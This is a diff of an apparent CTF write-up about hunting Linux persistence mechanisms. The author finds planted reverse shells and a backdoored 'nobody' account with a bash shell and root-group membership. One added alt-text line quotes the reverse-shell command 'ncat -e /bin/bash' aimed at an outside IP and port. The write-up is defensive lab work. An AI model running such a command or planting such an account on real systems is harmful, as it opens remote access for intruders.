@@ -100,7 +100,7 @@ This part of the room doesn't have us investigate anything, but instead goes int
 
 As mentioned, giorgio has root access to the server, so we escalate our privileges with `sudo -s` and receive an odd message:
 
-![Ncat: TIMEOUT.](/assets/img/uploads/sudo-s.png)
+![Ncat: TIMEOUT.](/assets/img/uploads/sudo-s.png "Ncat: TIMEOUT.")
 
 **Answer:** Ncat: TIMEOUT.
 
@@ -108,7 +108,7 @@ As mentioned, giorgio has root access to the server, so we escalate our privileg
 
 We press enter to continue and are provided another unexpected result:
 
-![](/assets/img/uploads/sudo-s-2.png)
+![ncat -e /bin/bash 172.10.6.9 6969](/assets/img/uploads/sudo-s-2.png "ncat -e /bin/bash 172.10.6.9 6969")
 
 How did that happen? I didn't even do anything -- I just logged as root, and it happened.
 
@@ -144,7 +144,7 @@ and we find our culprit: yet another reverse shell.  Our malicious friend sure i
 
 The above instructions heavily imply that there is something amiss with an account, so let's check out /etc/passwd to see if anything stands out:
 
-![](/assets/img/uploads/nobody.png)
+![nobody](/assets/img/uploads/nobody.png "nobody")
 
 Nobody is looking a lot like somebody!
 
@@ -154,4 +154,22 @@ The nobody account usually doesn't have much in the way of permissions as it is 
 nobody:x:65534:65534:Nobody:/nonexistent:/usr/sbin/nologin
 ```
 
-Compare this to the entry found on giorgio's computer.  Giorgio's nobody has a bash shell assigned to it and is a member of the root group, giving it some elevated permissions (albeit not as much as root itself).
+Compare this to the entry found on giorgio's computer.  Giorgio's nobody has a bash shell assigned to it and is a member of the root group, giving it some elevated permissions (albeit not as much as root itself).  This allows someone -- like our malicious friend -- to log in as the nobody account.
+
+**Answer:** nobody
+
+### Task 6: Final Thoughts
+
+> Finally, as you've already found the final persistence mechanism, there's value in going all the way through to the end.
+>
+> The adversary left a golden nugget of "advise" somewhere.
+
+##### What is the nugget?
+
+Logging in to nobody, we visit its "nonexistent" home directory and take a look around with `ls -la`.  Lo and behold, an unusual file name: 
+
+![.youfoundme](/assets/img/uploads/youfoundme.png ".youfoundme")
+
+Reading the .youfoundme file with `cat` reveals our second and final flag for this room.
+
+**Answer**: \*\*\*{\*\*\*\*\*\*\*\*\*\*\*\*\**}
